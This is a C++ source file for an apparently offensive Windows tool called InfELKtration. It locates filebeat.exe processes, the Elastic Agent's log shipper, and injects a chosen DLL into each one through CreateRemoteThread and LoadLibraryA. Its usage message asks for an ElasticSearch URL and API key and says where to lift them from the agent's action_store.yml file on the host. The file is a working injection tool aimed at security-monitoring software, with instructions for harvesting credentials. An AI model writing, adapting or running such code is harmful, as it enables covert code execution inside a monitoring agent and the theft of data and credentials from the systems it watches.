#include <iostream>
#include <windows.h>
#include <memoryapi.h>
#include <processthreadsapi.h>
#include <TlHelp32.h>
#include <tchar.h>

#include "Logger.h"

#include "LibConstants.h"

#define DLL_FILEPATH_MAX_LENGTH 120
#define MAX_PIDS 5
    
// code references:
// https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes
// https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes

BOOL inject_dll(DWORD, const char *);
DWORD get_filebeat_pids();

DWORD targetPids[MAX_PIDS+1] = { 0 };

int main(int argc, char **argv)
{
    DWORD ret, i;

    if (argc != 4) {
        Logger::Error("Not enough arguments!");
        Logger::Error("Usage: %s [path to InfELKtrationInjectLib.dll] [full URL to ElasticSearch server] [ElasticSearch API key]", argv[0]);
        Logger::Error("You can get the URL/API key from C:\\Program Files\\Elastic\\Agent\\data\\elastic-agent-xxxxxx\\action_store.yml, at something like policy.outputs.default at the bottom");
        
        return 1;
    }

    if (!(ret = get_filebeat_pids())) {
        Logger::Error("Failed to find filebeat.exe processes");
        return 1;
    }

    Logger::Info("Found %d filebeat.exe processes", ret);

    Logger::Info("Injecting DLL at %s", argv[1]);

    for (i = 0; targetPids[i]; i++) {
        if (inject_dll(targetPids[i], argv[1])) {
            Logger::Info("Successfully injected DLL in pid %d", targetPids[i]);
        }
        else {
            Logger::Error("Failed to inject DLL in pid %d", targetPids[i]);
        }
    }

    return 0;
}

DWORD get_filebeat_pids() {
    HANDLE hSnapshot;
    PROCESSENTRY32 processEntry;
    DWORD targetPidCount = 0;

    // get snapshot of running processes on the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        Logger::Error("CreateToolhelp32Snapshot failed");
        Logger::LastError();
        return 0;
    }

    // PROCESSENTRY32 docs state that the size needs to be initialized b/f calling Process32First
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // get the first process
    if (!Process32First(hSnapshot, &processEntry)) {
        Logger::Error("Process32First failed");
        Logger::LastError();
        return 0;
    }

    // loop through processes
    do {
        if (targetPidCount == MAX_PIDS) {
            Logger::Error("Found too many filebeat.exe processes");
            return 0;
        }
        if (CompareStringOrdinal(L"filebeat.exe", -1, processEntry.szExeFile, -1, false) == CSTR_EQUAL) {
            Logger::Info("Found filebeat.exe (pid=%d)", processEntry.th32ProcessID);
            targetPids[targetPidCount++] = processEntry.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &processEntry));

    CloseHandle(hSnapshot);

    return targetPidCount;
}

BOOL inject_dll(DWORD pid, const char *dllFilename) {
    HANDLE hProcess;
    LPVOID szDllFilepath;
    HMODULE hKernel32;
    LPTHREAD_START_ROUTINE loadLibrary;
    
    Logger::Info("Injecting into pid %d", pid);
    
    // open handle to target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (!hProcess) {
        Logger::Error("OpenProcess failed");
        Logger::LastError();
        return false;
    }
    
    Logger::Info("Opened handle to target process: 0x%p", hProcess);
    
    // allocate memory for the dll filepath
    szDllFilepath = VirtualAllocEx(hProcess, NULL, DLL_FILEPATH_MAX_LENGTH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!szDllFilepath) {
        Logger::Error("VirtualAllocEx failed");
        Logger::LastError();
        return false;
    }
    
    Logger::Info("Allocated mem for DLL filepath: 0x%p", szDllFilepath);
    
    // write dll path into target process
    if (!WriteProcessMemory(hProcess, szDllFilepath, dllFilename, DLL_FILEPATH_MAX_LENGTH, NULL)) {
        Logger::Error("WriteProcessMemory failed");
        Logger::LastError();
        return false;
    }
    
    Logger::Info("Copied DLL path into target process");

    // get the base addr for kernel32.dll
    hKernel32 = GetModuleHandleA("Kernel32");
    if (!hKernel32) {
        Logger::Error("GetModuleHandleA failed");
        Logger::LastError();
        return false;
    }

    // get the address of LoadLibraryA
    loadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
    if (!loadLibrary) {
        Logger::Error("GetProcAddress failed");
        Logger::LastError();
        return false;
    }

    // load the DLL in the target process, this executes dllmain for DLL_PROCESS_ATTACH
    CreateRemoteThread(hProcess, NULL, NULL, loadLibrary, szDllFilepath, NULL, NULL);
    
    Logger::Info("Executed DLL in target process");
    
    CloseHandle(hProcess);

    return true;
}